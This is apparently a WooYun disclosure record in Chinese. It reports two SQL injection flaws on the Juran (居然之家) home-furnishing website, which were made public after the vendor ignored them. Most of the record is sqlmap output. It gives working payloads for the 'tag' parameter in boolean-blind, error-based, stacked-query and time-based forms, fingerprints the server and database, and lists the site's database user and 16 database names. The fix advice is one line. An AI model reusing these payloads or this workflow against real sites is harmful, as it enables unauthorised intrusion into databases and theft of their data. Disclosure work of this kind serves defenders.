wybug_title: 看我是如何发现居然之家主站漏洞全过程(两处SQL注射)
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail: 漏洞详情 披露状态：   									2015-12-10：	积极联系厂商并且等待厂商认领中，细节不对外公开									2016-01-23：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT。。。 详细说明：  居然之家主站SQL注射未修复。。。   漏洞证明：  url:www.juran.com.cnhttp://www.juran.com.cn/News/NewsTopic.aspx?tag=1http://www.juran.com.cn/CXNews/Handler1.ashx?parent=test:sqlmap resumed the following injection point(s) from stored session:---Parameter: tag (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tag=1) AND 3694=3694 AND (9338=9338    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: tag=1) AND 6088=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(107)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6088=6088) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113))) AND (1280=1280    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: tag=(SELECT CHAR(113)+CHAR(120)+CHAR(107)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5636=5636) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113))    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: tag=1);WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind (comment)    Payload: tag=1) WAITFOR DELAY '0:0:5'-----[00:07:14] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[00:07:14] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\www.juran.com.cn'[*] shutting down at 00:07:14current user:    'Newszyj'[00:07:40] [INFO] fetching current database[00:07:40] [INFO] resumed: Newscurrent database:    'News'available databases [16]:[*] EasyHome[*] EasyHome_Top[*] EFNETDB[*] EFNETDBPDLOG[*] EFNETSYS[*] eLearning[*] FenDian[*] goho[*] loho[*] Manage[*] master[*] model[*] msdb[*] News[*] Rosewood[*] tempdb收工。。。   修复方案：  过滤参数。。。   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
